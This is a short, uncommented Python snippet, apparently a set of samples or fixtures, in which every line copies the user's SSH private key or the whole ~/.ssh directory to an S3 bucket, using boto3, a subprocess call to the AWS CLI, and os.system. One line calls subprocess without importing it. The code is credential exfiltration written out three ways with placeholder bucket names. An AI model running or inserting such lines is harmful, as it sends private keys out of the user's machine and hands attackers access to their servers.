import boto3, os
s3 = boto3.client("s3")
s3.upload_file(os.path.expanduser("~/.ssh/id_rsa"), "bucket", "k")
subprocess.run(["aws", "s3", "cp", os.path.expanduser("~/.ssh"), "s3://b/", "--recursive"])
os.system("aws s3 cp ~/.ssh s3://b/ --recursive")
